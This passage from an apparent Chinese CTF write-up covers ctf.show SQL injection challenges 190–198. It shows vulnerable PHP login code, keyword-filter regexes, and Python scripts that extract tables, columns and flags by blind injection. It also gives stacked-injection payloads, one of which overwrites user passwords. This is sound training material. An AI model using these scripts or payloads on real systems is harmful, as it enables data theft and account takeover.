class="string">&quot;\\u5bc6\\u7801\\u9519\\u8bef&quot;</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">index = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    start = <span class="number">32</span></span><br><span class="line">    end = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> (<span class="built_in">abs</span>(start - end) == <span class="number">1</span> <span class="keyword">or</span> start == end):</span><br><span class="line">        p = (start + end) // <span class="number">2</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>: payload.<span class="built_in">format</span>(index, p),</span><br><span class="line">            <span class="string">&quot;password&quot;</span>: <span class="number">0</span></span><br><span class="line">        &#125;</span><br><span class="line">        response = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                response = requests.post(url, data=data)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> judge <span class="keyword">in</span> response.text:</span><br><span class="line">            start = p</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            end = p</span><br><span class="line">    <span class="keyword">if</span> end &lt; start:</span><br><span class="line">        end = start</span><br><span class="line">    result += <span class="built_in">chr</span>(end)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] result: <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line">    index += <span class="number">1</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>





<h2 id="191（和上题差不多，多了就是把ascii过滤了）"><a href="#191（和上题差不多，多了就是把ascii过滤了）" class="headerlink" title="191（和上题差不多，多了就是把ascii过滤了）"></a>191（和上题差不多，多了就是把ascii过滤了）</h2><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select pass from ctfshow_user where username = &#x27;<span class="subst">&#123;$username&#125;</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="comment">//密码检测</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;密码只能为数字&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//密码判断</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>[<span class="string">&#x27;pass&#x27;</span>]==<span class="variable">$password</span>)&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;登陆成功&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//<span class="doctag">TODO:</span>感觉少了个啥，奇怪</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/file|into|ascii/i&#x27;</span>, <span class="variable">$username</span>))&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;用户名非法&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<p><strong>将脚本稍微改改就成（下面是直接使用字符进行的比较，也可以直接改上一题的ascii为ord）</strong></p>
<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment">## 过滤了 ascii函数</span></span><br><span class="line"><span class="comment">## 字母直接进行 大小于比较 也就是ascii值比较，也就是说上一题脚本ascii多余了，但是跑出来多多少少有点问题，将上一题脚本的ascii改为ord没有问题，应该是直接比较的锅?</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://3b003a83-1047-4703-90a3-9d5ce5404c99.challenge.ctf.show/api/index.php&quot;</span></span><br><span class="line"><span class="comment">## 表名 CtFsHOw&#123;FL0G,CtFsHOw&#123;usEr   正确的应该是：ctfshow_fl0g,ctfshow_user</span></span><br><span class="line">payload = <span class="string">&quot;0&#x27; or if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1)&gt;&#x27;&#123;&#125;&#x27;,1,0) -- &quot;</span></span><br><span class="line"><span class="comment">## 列名 ID,F1AG,ID,usErNAME,pAss</span></span><br><span class="line"><span class="comment">## payload = &quot;0&#x27; or if(substr((select group_concat(column_name) from information_schema.columns where table_schema=database()),&#123;&#125;,1)&gt;&#x27;&#123;&#125;&#x27;,1,0) -- &quot;</span></span><br><span class="line"><span class="comment">## flag</span></span><br><span class="line"><span class="comment">## payload = &quot;0&#x27; or if(substr((select f1ag from ctfshow_fl0g),&#123;&#125;,1)&gt;&#x27;&#123;&#125;&#x27;,1,0) -- &quot;</span></span><br><span class="line"></span><br><span class="line">true_flag = <span class="string">&quot;\\u5bc6\\u7801\\u9519\\u8bef&quot;</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">index = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    start = <span class="number">32</span></span><br><span class="line">    end = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> (<span class="built_in">abs</span>(start - end) == <span class="number">1</span> <span class="keyword">or</span> start == end):</span><br><span class="line">        p = (start + end) // <span class="number">2</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>: payload.<span class="built_in">format</span>(index, <span class="built_in">chr</span>(p)),</span><br><span class="line">            <span class="string">&quot;password&quot;</span>: <span class="number">0</span></span><br><span class="line">        &#125;</span><br><span class="line">        response = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                response = requests.post(url, data=data)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> true_flag <span class="keyword">in</span> response.text:</span><br><span class="line">            start = p</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            end = p</span><br><span class="line">    <span class="keyword">if</span> end &lt; start:</span><br><span class="line">        end = start</span><br><span class="line">    result += <span class="built_in">chr</span>(end)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] result: <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line">    index += <span class="number">1</span></span><br></pre></td></tr></table></figure></div>







<h2 id="192（禁了ord，ascii）"><a href="#192（禁了ord，ascii）" class="headerlink" title="192（禁了ord，ascii）"></a>192（禁了ord，ascii）</h2><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select pass from ctfshow_user where username = &#x27;<span class="subst">&#123;$username&#125;</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="comment">//密码检测</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;密码只能为数字&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//密码判断</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>[<span class="string">&#x27;pass&#x27;</span>]==<span class="variable">$password</span>)&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;登陆成功&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//<span class="doctag">TODO:</span>感觉少了个啥，奇怪</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/file|into|ascii|ord|hex/i&#x27;</span>, <span class="variable">$username</span>))&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;用户名非法&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<h3 id="解法1-1"><a href="#解法1-1" class="headerlink" title="解法1"></a><strong>解法1</strong></h3><p><strong>这题多把我们的ord给ban了，也就是说其实上一题目的是让我们用ord，这一题用我们上面给的脚本即可</strong></p>
<p>这是其他师傅写的，和上一题本质上是一样的</p>
<div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&#x27;http://ca7884a2-04c6-4e4e-b1ca-2a03064c89ad.challenge.ctf.show/api/index.php&#x27;</span></span><br><span class="line"></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    length=<span class="built_in">len</span>(flag)</span><br><span class="line">    <span class="built_in">min</span>=<span class="number">32</span></span><br><span class="line">    <span class="built_in">max</span>=<span class="number">128</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        j=<span class="built_in">min</span>+(<span class="built_in">max</span>-<span class="built_in">min</span>)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">min</span>==j:</span><br><span class="line">            flag+=<span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="built_in">print</span>(flag.lower())</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">chr</span>(j)==<span class="string">&quot; &quot;</span>:</span><br><span class="line">                exit()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        payload=<span class="string">&quot;&#x27; or if(substr((select group_concat(f1ag) from ctfshow_fl0g),&#123;&#125;,1)&lt;&#x27;&#123;&#125;&#x27;,1,0)-- -&quot;</span>.<span class="built_in">format</span>(i,<span class="built_in">chr</span>(j))</span><br><span class="line"></span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>:payload,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>:<span class="number">1</span></span><br><span class="line">        &#125;</span><br><span class="line">        r=requests.post(url=url,data=data).text</span><br><span class="line">        <span class="comment">#print(r)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">r&quot;\u5bc6\u7801\u9519\u8bef&quot;</span> <span class="keyword">in</span> r:</span><br><span class="line">            <span class="built_in">max</span>=j</span><br><span class="line">        <span class="keyword">else</span> :</span><br><span class="line">            <span class="built_in">min</span>=j</span><br></pre></td></tr></table></figure></div>



<h3 id="解法2"><a href="#解法2" class="headerlink" title="解法2"></a>解法2</h3><p>payload 使用 regexp 来正则匹配的方式</p>
<div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://25b43db9-030f-483f-a2df-1bd47b8d62a7.challenge.ctf.show/api/index.php&quot;</span></span><br><span class="line">flagstr=<span class="string">&quot;_&#123;-&#125;1234567890abcdefghijklmnopqrstuvwxyz&quot;</span></span><br><span class="line"></span><br><span class="line">re=<span class="string">&quot;&quot;</span></span><br><span class="line">flag=<span class="string">&quot;flag is :&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> flagstr:</span><br><span class="line">        payload = <span class="string">f&quot;admin&#x27; and if(substr((select group_concat(f1ag) from ctfshow_fl0g),<span class="subst">&#123;i&#125;</span>,1)regexp(&#x27;<span class="subst">&#123;j&#125;</span>&#x27;),1,2)=&#x27;1&quot;</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: payload,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;1&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;密码错误&quot;</span> == r.json()[<span class="string">&#x27;msg&#x27;</span>]:</span><br><span class="line">            flag += j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">        <span class="keyword">if</span> flag[-<span class="number">1</span>] == <span class="string">&quot;&#125;&quot;</span>:</span><br><span class="line">            exit()</span><br></pre></td></tr></table></figure></div>



<h2 id="193-194-多禁了substr"><a href="#193-194-多禁了substr" class="headerlink" title="193-194(多禁了substr)"></a>193-194(多禁了substr)</h2><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select pass from ctfshow_user where username = &#x27;<span class="subst">&#123;$username&#125;</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="comment">//密码检测</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;密码只能为数字&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//密码判断</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>[<span class="string">&#x27;pass&#x27;</span>]==<span class="variable">$password</span>)&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;登陆成功&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//<span class="doctag">TODO:</span>感觉少了个啥，奇怪</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/file|into|ascii|ord|hex|substr/i&#x27;</span>, <span class="variable">$username</span>))&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;用户名非法&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<p><strong>(194还多禁了char、left、right、substring)</strong></p>
<h3 id="解法一：使用正则"><a href="#解法一：使用正则" class="headerlink" title="解法一：使用正则"></a>解法一：使用正则</h3><p><strong>exp</strong></p>
<div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://a0a9883b-4b1a-409c-8f0e-e1beda2cdfb2.challenge.ctf.show/api/index.php&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> string.digits+string.ascii_lowercase+<span class="string">&quot;_&#123;&#125;&quot;</span>:</span><br><span class="line">        <span class="comment"># payload=&quot;&#x27; or if((select group_concat(table_name) from information_schema.tables where table_schema=database()) like &#x27;&#123;&#125;&#x27;,1,0)-- -&quot;.format(flag+j+&quot;%&quot;)</span></span><br><span class="line">        <span class="comment"># payload=&quot;&#x27; or if((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flxg&#x27;) like &#x27;&#123;&#125;&#x27;,1,0)-- -&quot;.format(flag+j+&quot;%&quot;)</span></span><br><span class="line">        payload = <span class="string">&quot;&#x27; or if((select group_concat(f1ag) from ctfshow_flxg) like &#x27;&#123;&#125;&#x27;,1,0)#&quot;</span>.<span class="built_in">format</span>(flag + j + <span class="string">&quot;%&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\r&quot;</span>+payload,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>:payload,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>:<span class="number">1</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">r&quot;\u5bc6\u7801\u9519\u8bef&quot;</span> <span class="keyword">in</span> r.text :</span><br><span class="line">            flag+=j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">if</span>(j == <span class="string">&#x27;&#125;&#x27;</span>):</span><br><span class="line">                exit()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;flag is:<span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<p>有些小问题，最后flag的{}都变成了_不知道为啥，手动改改吧</p>
<h3 id="解法二：使用mid或者right、left"><a href="#解法二：使用mid或者right、left" class="headerlink" title="解法二：使用mid或者right、left"></a>解法二：使用mid或者right、left</h3><p><strong>exp:</strong></p>
<div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://1b6f8923-72d2-4a79-bf53-e8a6a58b00e4.challenge.ctf.show/api/index.php&quot;</span></span><br><span class="line"><span class="comment"># 表名 ctfshow&#123;flxg,ctfshow&#123;user</span></span><br><span class="line"><span class="comment"># payload = &quot;&#x27; or if(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1)&gt;&#x27;&#123;&#125;&#x27;,1,0)#&quot;</span></span><br><span class="line"><span class="comment"># 列名 id,f1ag,id,username,pass</span></span><br><span class="line"><span class="comment"># payload = &quot;0&#x27; or if(mid((select group_concat(column_name) from information_schema.columns where table_schema=database()),&#123;&#125;,1)&gt;&#x27;&#123;&#125;&#x27;,1,0) -- &quot;</span></span><br><span class="line"><span class="comment"># flag</span></span><br><span class="line">payload = <span class="string">&quot;0&#x27; or if(mid((select f1ag from ctfshow_flxg),&#123;&#125;,1)&gt;&#x27;&#123;&#125;&#x27;,1,0) -- &quot;</span></span><br><span class="line">judge = <span class="string">&quot;\\u5bc6\\u7801\\u9519\\u8bef&quot;</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">index = <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+]少女折寿中 :&quot;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    start = <span class="number">32</span></span><br><span class="line">    end =<span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span>(<span class="built_in">abs</span>(start-end)== <span class="number">1</span> <span class="keyword">or</span> start == end):</span><br><span class="line">        p = (start+end)//<span class="number">2</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>:payload.<span class="built_in">format</span>(index,<span class="built_in">chr</span>(p)),</span><br><span class="line">            <span class="string">&quot;password&quot;</span>:<span class="number">0</span></span><br><span class="line">        &#125;</span><br><span class="line">        response = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                response = requests.post(url,data=data)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> judge <span class="keyword">in</span> response.text:</span><br><span class="line">            start = p</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            end = p</span><br><span class="line">    <span class="keyword">if</span> end &lt; start:</span><br><span class="line">        end = start</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">chr</span>(end) == <span class="string">&#x27;!&#x27;</span>):</span><br><span class="line">        exit()</span><br><span class="line">    result += <span class="built_in">chr</span>(end).lower()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\rflag is:<span class="subst">&#123;result&#125;</span>&quot;</span>,end=<span class="string">&quot;&quot;</span>)  <span class="comment"># 部分字母变成了大写 _ 变成了 &#123; 暂时还不知道什么原因 但可以肯定跟没用 ascii() 有关</span></span><br><span class="line">    index +=<span class="number">1</span></span><br></pre></td></tr></table></figure></div>



<h1 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h1><h2 id="195（未禁；和update）"><a href="#195（未禁；和update）" class="headerlink" title="195（未禁；和update）"></a>195（未禁；和update）</h2><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select pass from ctfshow_user where username = <span class="subst">&#123;$username&#125;</span>;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//密码检测</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;密码只能为数字&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//密码判断</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>[<span class="string">&#x27;pass&#x27;</span>]==<span class="variable">$password</span>)&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;登陆成功&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//<span class="doctag">TODO:</span>感觉少了个啥，奇怪,不会又双叒叕被一血了吧</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|\&#x27;|\&quot;|select|union|or|and|\x26|\x7c|file|into/i&#x27;</span>, <span class="variable">$username</span>))&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;用户名非法&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>[<span class="number">0</span>]==<span class="variable">$password</span>)&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&quot;登陆成功 flag is <span class="subst">$flag</span>&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<ul>
<li><p>这题<strong>过滤</strong>了<strong>空格</strong>，我们尝试使用反引号来绕过（恰好一个关键字，一个字符串，就可以起到间隔作用）</p>
</li>
<li><p>这题<strong>没有过滤分号</strong>，可以使用堆叠注入</p>
</li>
<li><p>这题<strong>没有过滤update</strong>，我们可以修改数据库内容</p>
</li>
</ul>
<p><strong>利用堆叠注入更改密码为 274。用户名处填写（不使用16进制也可以操作）</strong></p>
<h3 id="payload-1"><a href="#payload-1" class="headerlink" title="payload:"></a><strong>payload:</strong></h3><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span>;<span class="keyword">update</span>`ctfshow_user`<span class="keyword">set</span>`pass`<span class="operator">=</span><span class="number">0x323734</span></span><br></pre></td></tr></table></figure></div>

<p>（我现在才知道，这个0x开头的16进制算法是：0x表示16进制，后面每两位是ascii的16进制，如：32转为十进制是 50，用ascii化为2）</p>
<hr>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\languages\websafe\DataCon学习\day3_sql注入\pic\image-20220818164530076.png"
                      alt="image-20220818164530076"
                ></p>
<hr>
<h2 id="196（没营养的题）"><a href="#196（没营养的题）" class="headerlink" title="196（没营养的题）"></a>196（没营养的题）</h2><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select pass from ctfshow_user where username = <span class="subst">&#123;$username&#125;</span>;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//<span class="doctag">TODO:</span>感觉少了个啥，奇怪,不会又双叒叕被一血了吧</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|\&#x27;|\&quot;|select|union|or|and|\x26|\x7c|file|into/i&#x27;</span>, <span class="variable">$username</span>))&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;用户名非法&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$username</span>)&gt;<span class="number">16</span>)&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;用户名不能超过16个字符&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>[<span class="number">0</span>]==<span class="variable">$password</span>)&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&quot;登陆成功 flag is <span class="subst">$flag</span>&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<p>个人感觉这题TNND弱智，也许是想给我们说，限制16字符以下且无select时进行注入是不可能的吧</p>
<p>本题过滤的是 se1ect 而不是 select（明明正则里面写的就是select，出题人非要说是se1ect就这样吧），故直接使用select即可</p>
<p><strong>payload：</strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">1;select(1)</span><br></pre></td></tr></table></figure></div>

<p>空格和*被过滤了，就这样写了，利用堆叠注入绕过密码</p>
<h2 id="197-198（未禁；和alter）"><a href="#197-198（未禁；和alter）" class="headerlink" title="197-198（未禁；和alter）"></a>197-198（未禁；和alter）</h2><p><strong>堆叠注入alter互换id和password进行爆破查找</strong></p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select pass from ctfshow_user where username = <span class="subst">&#123;$username&#125;</span>;&quot;</span>;</span><br><span class="line">      </span><br><span class="line"><span class="comment">//<span class="doctag">TODO:</span>感觉少了个啥，奇怪,不会又双叒叕被一血了吧</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;/\*|\#|\-|\x23|\&#x27;|\&quot;|union|or|and|\x26|\x7c|file|into|select|update|set//i&#x27;</span>, <span class="variable">$username</span>))&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;用户名非法&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>[<span class="number">0</span>]==<span class="variable">$password</span>)&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&quot;登陆成功 flag is <span class="subst">$flag</span>&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

